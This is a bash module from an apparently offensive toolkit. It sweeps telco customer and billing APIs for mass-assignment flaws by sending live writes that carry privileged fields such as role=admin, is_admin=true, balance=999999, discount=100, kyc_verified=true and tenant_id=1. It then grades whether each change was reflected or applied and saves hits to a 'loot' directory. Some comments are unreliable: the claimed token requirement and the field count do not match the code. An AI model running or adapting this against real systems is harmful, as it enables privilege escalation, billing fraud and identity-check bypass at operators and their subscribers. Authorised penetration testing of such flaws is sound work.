#!/usr/bin/env bash
# 50_mass_assign.sh — cloudsting module 50: mass assignment — the fields the server trusts because the client sent them
# Verbs: --sweep | --check | --fields | --shadow | --verdicts | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# The root is derived from this file only after the core is sourced. Clear any
# inherited value first: a caller that itself sources the core would otherwise
# hand this module *its* directory, and the module would read its own name as
# a path.
unset CS_MOD_DIR

# The shared core owns the root, the loot tree, the run id, the TSV writer,
# the three-state provider gate, redaction, the findings store and the
# selftest ledger.
MODULE_ID="50_mass_assign"
MOD_NAME="Mass Assignment (fields the server trusts because the client sent them)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

MA_RUN_ID="$CS_RUN_ID"
export MA_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/mass_assign"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"
ECHO_FILE="$OUT_DIR/echo-$RUN_ID.tsv"

: "${MA_TIMEOUT:=10}"       # per-request wall clock, seconds
: "${MA_LIMIT:=0}"          # 0 = every endpoint in the table
: "${MA_ECHO_BYTES:=4096}"  # how much of a reflected body to inspect
: "${MA_FOLLOW:=0}"         # follow redirects (0 keeps a login bounce visible)
: "${MA_UA:=Mozilla/5.0 (Linux; Android 13) cloudsting/50}"

ma_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── endpoints that take a client-supplied object ─────────────────
# One row per endpoint class a telco BSS ships:
#   <class>\t<path>\t<method>\t<what the body creates>\t<id-field>
ma_endpoints() {
    cat <<'EPS'
register	/api/customer/register	POST	a subscriber account	msisdn
signup	/api/auth/register	POST	a login on a telco portal	msisdn
profile	/api/customer/profile	PUT	the caller's own profile	msisdn
account	/api/account	POST	an account record	account_id
subscriber	/api/subscriber	POST	a line record	msisdn
sim	/api/sim/register	POST	a sim registration	iccid
agent	/api/agent/register	POST	a retail agent	agent_id
device	/api/device/register	POST	a handset binding	imei
order	/api/order	POST	an order	order_id
ticket	/api/ticket	POST	a support ticket	ticket_id
payment	/api/payment	POST	a payment	payer_msisdn
wallet	/api/wallet	POST	a wallet	wallet_id
EPS
}

# The field names servers trust that a customer must never set. Grouped by the
# damage they do, because a reflected `role:admin` and a reflected `balance:0`
# are the same bug with a different bill attached.
#   <group>\t<field>\t<value>\t<why>
ma_fields() {
    cat <<'FIELDS'
role	role	admin	the classic: an enum the server reads straight off the body
role	is_admin	true	boolean twin of the same
role	isAdmin	true	camelCase twin
role	admin	true	flag form
role	type	superadmin	role stored in a type column
role	user_type	admin	stored as a string enum
role	permissions	*	scope list
role	scopes	admin:write	oauth-shaped scope list
role	roles	admin	plural form
role	group	admin	group membership
role	tier	staff	portal tier
role	account_type	admin	account classification
money	balance	999999	the value is written and the next read reconciles it
money	credit	999999	prepaid credit
money	airtime_balance	999999	airtime wallet
money	wallet_balance	999999	wallet
money	amount	999999	on a refund or credit body
money	limit	0	puts the account under the limit and past the control
money	credit_limit	999999	postpaid ceiling
money	discount	100	the price of everything
verify	email_verified	true	skips a verification step
verify	phone_verified	true	skips sms verification
verify	verified	true	generic
verify	kyc_verified	true	skips an identity check on a telco that has one
verify	kyc_status	approved	the status the check reads
verify	status	active	forcing a pending account live
verify	email_verified_at	2020-01-01T00:00:00Z	timestamp form
expose	is_internal	true	the response starts carrying admin fields
expose	internal	true	flag form
expose	is_staff	true	staff twin
expose	is_superuser	true	django twin
expose	branch_id	1	moves the caller into another operator branch
expose	tenant_id	1	cross-tenant reference
expose	owner_id	1	reassigning the owner
expose	parent_id	1	walking up the tree
expose	id	1	forcing the primary key
FIELDS
}

# Portals that leak the whole writable schema in an -example body, a swagger
# definition or a form. Checked before a field is sent, so a sweep on a
# documented portal does not have to guess.
ma_schema_paths() {
    cat <<'SCHEMAS'
/swagger.json
/v2/api-docs
/v3/api-docs
/openapi.json
/api/swagger.json
/api-docs
/docs/swagger.json
/api/v1/docs
SCHEMAS
}

# ── one request ──────────────────────────────────────────────────
#   ma_send <method> <url> [token] [json-body]
#   -> code \x1f hash \x1f len \x1f body-path
# The sentinel keeps an empty body from sliding the path into the wrong field.
ma_send() {
    local method="$1" url="$2" token="${3:-}" payload="${4:-}"
    local body; body="$(mktemp "$CS_SCRATCH/ma.XXXXXX")" 2>/dev/null || body="$OUT_DIR/.ma.$$"
    local -a args=(--silent --show-error --max-time "$MA_TIMEOUT" -X "$method"
                   --write-out '%{http_code}\t%{size_download}' --output "$body"
                   -A "$MA_UA" -H 'Accept: application/json, text/plain, */*')
    [[ "$MA_FOLLOW" == "1" ]] && args+=(-L)
    [[ -n "$token" ]] && args+=(-H "Authorization: Bearer $token")
    [[ -n "$payload" ]] && args+=(-H 'Content-Type: application/json' --data "$payload")

    local meta code len
    meta="$(curl "${args[@]}" "$url" 2>/dev/null)" || meta=""
    case "$meta" in
        [0-9][0-9][0-9]$'\t'*) IFS=$'\t' read -r code len <<<"$meta" ;;
        *) code="000"; len=0 ;;
    esac
    [[ -s "$body" ]] || : > "$body" 2>/dev/null || true
    printf '%s\037%s\037%s\037%s\n' "${code:-000}" "$(cs_fingerprint "$(head -c "$MA_ECHO_BYTES" "$body" 2>/dev/null)")" "${len:-0}" "$body"
}

ma_json_keys() {
    local body="$1"
    head -c 1 "$body" 2>/dev/null | grep -q '[{\[]' || return 0
    jq -r 'if type=="object" then (keys_unsorted | join(","))
           elif type=="array" then "array:" + (length|tostring)
           else "scalar" end' "$body" 2>/dev/null | head -c 400
}

# ── the verdict ──────────────────────────────────────────────────
# Mass assignment is proven by the server doing a thing, not by the server
# accepting a field. Three proofs, strongest last:
#   refused   — the send was rejected (4xx, or a 200 carrying an error envelope)
#   ignored   — accepted, and nothing about the value came back
#   reflected — the value came back in the response body
#   applied   — the value came back AND the object reads back changed
# A reflected field alone is a weaker claim than an applied one, so they are
# separate verdicts and separate severities.
#   ma_verdict <code> <keys> <field> <value> <echo> <readback-keys>
ma_verdict() {
    local code="$1" keys="$2" field="$3" value="$4" echo_hit="${5:-0}" readback="${6:-}"

    case "$code" in
        000)     printf 'unreachable\ttimeout-or-refused\n'; return ;;
        401|403) printf 'refused\tcode-%s\n' "$code"; return ;;
        404|410) printf 'absent\tno-such-endpoint\n'; return ;;
        405)     printf 'no-method\tendpoint-does-not-take-%s\n' "$field"; return ;;
        400|415|422) printf 'refused\tvalidation-%s\n' "$code"; return ;;
        5*)      printf 'error\tserver-%s\n' "$code"; return ;;
    esac
    case "$code" in
        200|201|202|204) ;;
        *) printf 'other\tcode-%s\n' "$code"; return ;;
    esac

    if printf '%s' "$keys" | grep -qiE '(^|,)(error|errors|denied|unauthorized|forbidden|invalid)(,|$)'; then
        printf 'refused\terror-envelope\n'; return
    fi

    # applied: the field is present on the object after the write
    if [[ -n "$readback" ]] && printf '%s' "$readback" | tr ',' '\n' | grep -qx "$field"; then
        printf 'applied\tfield-present-on-readback\n'; return
    fi
    # applied, second form: the readback carries the exact value we sent
    if [[ -n "$readback" ]] && printf '%s' "$readback" | grep -qF "$value"; then
        printf 'applied\tvalue-present-on-readback\n'; return
    fi
    # reflected: the value is in the write response itself
    if [[ "$echo_hit" == "1" ]]; then
        printf 'reflected\tvalue-echoed-in-response\n'; return
    fi

    printf 'ignored\taccepted-without-effect\n'
}

# ── verbs ────────────────────────────────────────────────────────
ma_cmd_fields() {
    local group field value why n=0
    while IFS=$'\t' read -r group field value why; do
        [[ -z "$group" ]] && continue
        cs_row FIELD "$field" "group=$group" "value=$value" "$why"
        n=$((n + 1))
    done < <(ma_fields)
    cs_row SUMMARY "fields=$n endpoints=$(ma_endpoints | wc -l | tr -d ' ')"
    return 0
}

ma_cmd_verdicts() {
    cs_row VERDICT applied "the write landed and the object reads back changed"
    cs_row VERDICT reflected "the value came back in the write response"
    cs_row VERDICT ignored "accepted, no effect observable"
    cs_row VERDICT refused "rejected by code or by an error envelope"
    return 0
}

# --shadow: the schema hint. Read the portal's own swagger and print the
# writable properties it advertises, so a sweep knows the field names before
# it guesses them.
#   ma_cmd_shadow <base-url>
ma_cmd_shadow() {
    local base="${1:-}"
    [[ -z "$base" ]] && { ma_log "usage: --shadow <base-url>"; return 2; }
    local p body code hash len path scheme
    for p in $(ma_schema_paths); do
        cs_split "$(ma_send GET "${base%/}$p")" code hash len path
        if [[ "$code" != "200" ]]; then rm -f "$path"; continue; fi
        local props
        props="$(jq -r '(.paths? // {}) as $p | [(.definitions? // .components.schemas? // {}) | to_entries[] | .key as $k | (.value.properties? // {}) | keys[] | "\($k).\(.)"] | .[0:80] | .[]' "$path" 2>/dev/null)"
        if [[ -n "$props" ]]; then
            cs_row SCHEMA "${base%/}$p" "$(printf '%s' "$props" | wc -l | tr -d ' ') properties"
            printf '%s\n' "$props" | while read -r sch; do cs_row PROPERTY "$sch"; done
        else
            cs_row SCHEMA "${base%/}$p" "no-property-definitions"
        fi
        rm -f "$path"
        return 0
    done
    cs_row SCHEMA none "no schema document answered"
    return 1
}

# --check: one endpoint, one field. Optional readback URL makes the strongest
# verdict available.
#   ma_cmd_check <base> <class|path> <field> [token] [readback-path]
ma_cmd_check() {
    local base="${1:-}" cls="${2:-}" field="${3:-}" token="${4:-}" readback="${5:-}"
    if [[ -z "$base" || -z "$cls" || -z "$field" ]]; then
        ma_log "usage: --check <base-url> <class|path> <field> [token] [readback-path]"
        return 2
    fi

    local path method idfield value group
    path="$(ma_endpoints | awk -F'\t' -v c="$cls" '$1==c{print $2}')"
    method="$(ma_endpoints | awk -F'\t' -v c="$cls" '$1==c{print $3}')"
    idfield="$(ma_endpoints | awk -F'\t' -v c="$cls" '$1==c{print $5}')"
    if [[ -z "$path" ]]; then
        case "$cls" in
            /*) path="$cls"; method="${MA_METHOD:-POST}"; idfield="msisdn" ;;
            *) ma_log "unknown endpoint class: $cls"; return 2 ;;
        esac
    fi

    group="$(ma_fields | awk -F'\t' -v f="$field" '$2==f{print $1; exit}')"
    value="$(ma_fields | awk -F'\t' -v f="$field" '$2==f{print $3; exit}')"
    value="${value:-true}"

    # A body the endpoint already wants, plus the field under test. The id
    # field is filled so a registration endpoint does not reject the request
    # before it ever reads the interesting key.
    local payload
    payload="$(jq -nc --arg idf "$idfield" --arg f "$field" --arg v "$value" \
        '{($idf): "+254700000000"} + {($f): (if $v=="true" then true
                                              elif $v=="false" then false
                                              elif ($v|test("^[0-9]+$")) then ($v|tonumber)
                                              else $v end)}')"

    local code hash len body keys
    cs_split "$(ma_send "$method" "${base%/}$path" "$token" "$payload")" code hash len body
    keys="$(ma_json_keys "$body")"

    # a reflected value is only a reflection if the literal value is there
    local echo_hit="0"
    case "$value" in
        true|false|1|0) : ;;   # too common to call a reflection on their own
        *) if grep -qF -- "$value" "$body" 2>/dev/null; then echo_hit="1"; fi ;;
    esac

    local rkeys=""
    if [[ -n "$readback" ]]; then
        local rcode rhash rlen rbody
        cs_split "$(ma_send GET "${base%/}$readback" "$token")" rcode rhash rlen rbody
        if [[ "$rcode" == "200" ]]; then rkeys="$(ma_json_keys "$rbody")"; fi
        rm -f "$rbody" 2>/dev/null
    fi

    local verdict reason
    IFS=$'\t' read -r verdict reason <<<"$(ma_verdict "$code" "$keys" "$field" "$value" "$echo_hit" "$rkeys")"

    cs_row TARGET "${base%/}$path"
    cs_row ENDPOINT "$cls" "$method" "id=$idfield"
    cs_row FIELD "$field" "group=${group:-unclassified}" "value=$value"
    cs_row PAYLOAD "$(printf '%s' "$payload" | head -c 300)"
    cs_row RESPONSE "$code" "$len"
    cs_row SHAPE "${keys:-none}"
    cs_row VERDICT "$verdict" "$reason"

    printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
        "$cls" "$method" "$field" "$value" "$code" "$verdict" "$reason" >> "$PROBE_FILE"

    case "$verdict" in
        applied|reflected)
            printf '%s\t%s\t%s\t%s\t%s\n' "$cls" "$field" "$value" "$verdict" "$reason" >> "$HIT_FILE"
            cs_row HIT "$field" "$value" "$verdict" "$reason"
            local sev="HIGH"
            [[ "$verdict" == "applied" ]] && sev="CRITICAL"
            case "$group" in
                role|verify) sev="CRITICAL" ;;
                money) sev="CRITICAL" ;;
            esac
            cs_findings_row "$MODULE_ID" "WEBAPI" "${base%/}$path" "$sev" "mass-assignment" \
                "$field=$value $verdict on $cls ($method) — ${group:-unknown} group"
            [[ "$echo_hit" == "1" ]] && printf '%s\t%s\t%s\n' "$cls" "$field" "$value" >> "$ECHO_FILE"
            rm -f "$body" 2>/dev/null
            return 0 ;;
    esac
    rm -f "$body" 2>/dev/null
    return 1
}

# --sweep: every endpoint, every field, one write each. This is 12 endpoints ×
# 38 fields = 456 writes, which is why the module refuses to run without a
# token by default: mass assignment is a broken-authorization bug, and an
# unauthenticated sweep mostly measures 401.
ma_cmd_sweep() {
    local base="${1:-}" token="${2:-}" group_filter="${3:-}"
    [[ -z "$base" ]] && { ma_log "usage: --sweep <base-url|host> [token] [role|money|verify|expose]"; return 2; }
    [[ "$base" == http*://* ]] || base="https://$base"

    : > "$PROBE_FILE"
    local checked=0 hits=0 cls path method idfield why group field value gf
    while IFS=$'\t' read -r cls path method idfield why; do
        [[ -z "$cls" ]] && continue
        while IFS=$'\t' read -r group field value gf; do
            [[ -z "$group" ]] && continue
            group_filter="${group_filter:-}"
            [[ -n "$group_filter" && "$group" != "$group_filter" ]] && continue
            (( MA_LIMIT > 0 && checked >= MA_LIMIT )) && break
            checked=$((checked + 1))
            if ma_cmd_check "$base" "$cls" "$field" "$token" >/dev/null 2>&1; then
                hits=$((hits + 1))
                cs_row LEAK "$cls" "$field" "$group"
            fi
        done < <(ma_fields)
    done < <(ma_endpoints)

    cs_row SUMMARY "checked=$checked hits=$hits"
    [[ "$hits" -gt 0 ]] && cs_row ARTIFACT "$HIT_FILE"
    return 0
}

ma_cmd_list() {
    local cls path method idfield why
    while IFS=$'\t' read -r cls path method idfield why; do
        [[ -z "$cls" ]] && continue
        printf '%s\t%s\t%s\t%s\n' "$cls" "$method" "$path" "$idfield"
    done < <(ma_endpoints)
    return 0
}

ma_cmd_status_tsv() {
    local curl_state jq_state
    command -v curl >/dev/null 2>&1 && curl_state="ok" || curl_state="missing"
    command -v jq   >/dev/null 2>&1 && jq_state="ok"   || jq_state="missing"
    printf '%s\t%s\tcurl-%s\tjq-%s\tendpoints-%s\tfields-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" "$jq_state" \
        "$(ma_endpoints | wc -l | tr -d ' ')" "$(ma_fields | wc -l | tr -d ' ')"
}

ma_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

ma_cmd_help() {
    cat <<'HELP'
cloudsting module 50 — Mass Assignment v1.0.0
  --check <base> <class|path> <field> [token] [readback]  one write, one verdict
  --sweep <base> [token] [role|money|verify|expose]       every endpoint × field
  --shadow <base>                                         read the portal's own schema
  --fields                                                the field table
  --verdicts                                              what each verdict means
  --list | --status-tsv | --menu | --selftest | --help

Verdicts, strongest last:
  refused   4xx, or a 200 carrying {"error"|"errors"|"invalid"}
  ignored   accepted with no observable effect
  reflected the value came back in the write response
  applied   the value came back AND the object reads back carrying it

Booleans and single digits are never counted as a reflection — true/false/1/0
appear in every response. Only a distinctive value proves an echo.

Groups: role (role, is_admin, permissions, scopes), money (balance, credit,
limit, discount), verify (email_verified, kyc_status, status), expose
(is_internal, tenant_id, owner_id, id).

Environment: MA_TIMEOUT (10), MA_LIMIT (0=all), MA_FOLLOW (0),
MA_ECHO_BYTES (4096), MA_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
ma_selftest() {
    cs_selftest_reset

    local n; n="$(ma_fields | wc -l | tr -d ' ')"
    chk fields-many    "$( (( n >= 30 )) && echo many || echo few )" "many"
    chk fields-4col    "$(ma_fields | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
    chk fields-unique  "$(ma_fields | cut -f2 | sort -u | wc -l | tr -d ' ')" "$n"
    chk fields-group   "$(ma_fields | awk -F'\t' '$1 !~ /^(role|money|verify|expose)$/{c++} END{print c+0}')" "0"
    chk fields-value   "$(ma_fields | awk -F'\t' '$3==""{c++} END{print c+0}')" "0"
    chk fields-why     "$(ma_fields | awk -F'\t' '$4==""{c++} END{print c+0}')" "0"
    chk endpoints-many "$( (( $(ma_endpoints | wc -l) >= 10 )) && echo many || echo few )" "many"
    chk endpoints-col  "$(ma_endpoints | awk -F'\t' 'NF!=5{c++} END{print c+0}')" "0"
    chk endpoints-path "$(ma_endpoints | awk -F'\t' '$2 !~ /^\//{c++} END{print c+0}')" "0"
    chk schemas-many   "$( (( $(ma_schema_paths | wc -l) >= 6 )) && echo many || echo few )" "many"

    local f
    for f in role is_admin balance kyc_verified tenant_id; do
        chk "field-$f" "$(ma_fields | cut -f2 | grep -cx "$f")" "1"
    done

    # the verdict, on synthetic answers
    chk v-unreach     "$(ma_verdict 000 '' role admin | cut -f1)" "unreachable"
    chk v-refused403  "$(ma_verdict 403 'error' role admin | cut -f1)" "refused"
    chk v-refused-env "$(ma_verdict 200 'error,message' role admin | cut -f1)" "refused"
    chk v-invalid-env "$(ma_verdict 200 'invalid' role admin | cut -f1)" "refused"
    chk v-absent      "$(ma_verdict 404 '' role admin | cut -f1)" "absent"
    chk v-nomethod    "$(ma_verdict 405 '' role admin | cut -f1)" "no-method"
    chk v-server      "$(ma_verdict 500 '' role admin | cut -f1)" "error"
    chk v-ignored     "$(ma_verdict 200 'id,msisdn' role admin 0 '' | cut -f1)" "ignored"
    chk v-reflected   "$(ma_verdict 200 'id,role' role admin 1 '' | cut -f1)" "reflected"
    chk v-applied-key "$(ma_verdict 200 'id' role admin 0 'id,role,msisdn' | cut -f1)" "applied"
    chk v-applied-val "$(ma_verdict 200 'id' balance 999999 0 'balance:999999' | cut -f1)" "applied"
    chk v-applied-re  "$(ma_verdict 200 'id' role admin 0 'id,role,msisdn' | cut -f2)" "field-present-on-readback"
    chk v-mirror-ok   "$(ma_verdict 201 'id' role admin 0 '' | cut -f1)" "ignored"

    # the payload builder keeps a boolean a boolean and a number a number
    local p
    p="$(jq -nc --arg idf msisdn --arg f is_admin --arg v true \
        '{($idf): "+254700000000"} + {($f): (if $v=="true" then true else $v end)}')"
    chk payload-bool  "$(printf '%s' "$p" | jq -r '.is_admin')" "true"
    chk payload-type  "$(printf '%s' "$p" | jq -r '.is_admin|type')" "boolean"
    p="$(jq -nc --arg idf msisdn --arg f balance --arg v 999999 \
        '{($idf): "+254700000000"} + {($f): (if ($v|test("^[0-9]+$")) then ($v|tonumber) else $v end)}')"
    chk payload-num   "$(printf '%s' "$p" | jq -r '.balance|type')" "number"
    chk payload-id    "$(printf '%s' "$p" | jq -r '.msisdn')" "+254700000000"

    # usage errors, not crashes
    local rc
    ma_cmd_check 2>/dev/null; rc=$?
    chk check-usage  "$rc" "2"
    ma_cmd_sweep 2>/dev/null; rc=$?
    chk sweep-usage  "$rc" "2"
    ma_cmd_shadow 2>/dev/null; rc=$?
    chk shadow-usage "$rc" "2"
    ma_cmd_check http://127.0.0.1:9 nosuchclass role 2>/dev/null; rc=$?
    chk check-unknown "$rc" "2"

    # a dead host is unreachable and never a hit
    local out
    out="$(ma_cmd_check http://127.0.0.1:9 register role 2>/dev/null)"
    chk dead-unreach "$(printf '%s' "$out" | grep -c 'unreachable')" "1"
    chk dead-nohit   "$(printf '%s' "$out" | grep -c '^HIT')" "0"

    # an explicit path is accepted and reported as such
    out="$(ma_cmd_check http://127.0.0.1:9 /api/whatever/free role 2>/dev/null)"
    chk explicit-path "$(printf '%s' "$out" | awk -F'\t' '$1=="ENDPOINT"{print $2}')" "/api/whatever/free"

    # an unknown field falls back to a true value rather than an empty body
    out="$(ma_cmd_check http://127.0.0.1:9 register totally_made_up 2>/dev/null)"
    chk unknown-field "$(printf '%s' "$out" | awk -F'\t' '$1=="FIELD"{print $4}')" "value=true"

    # shape contracts
    chk status-fields "$(ma_cmd_status_tsv | awk -F'\t' '{print NF}')" "6"
    chk status-module "$(ma_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(ma_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(ma_cmd_help | head -1 | grep -ci 'Mass Assignment')" "1"
    chk list-fields   "$(ma_cmd_list | awk -F'\t' '{print NF}' | sort -u | tr '\n' ' ')" "4 "
    chk verdict-rows  "$(ma_cmd_verdicts | wc -l | tr -d ' ')" "4"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --check)    shift; ma_cmd_check "$@";;
    --sweep)    shift; ma_cmd_sweep "$@";;
    --shadow)   shift; ma_cmd_shadow "$@";;
    --fields)   ma_cmd_fields;;
    --verdicts) ma_cmd_verdicts;;
    --list)     ma_cmd_list;;
    --status-tsv|--status) ma_cmd_status_tsv;;
    --menu)     ma_cmd_menu;;
    --selftest) ma_selftest;;
    *)          ma_cmd_help;;
esac
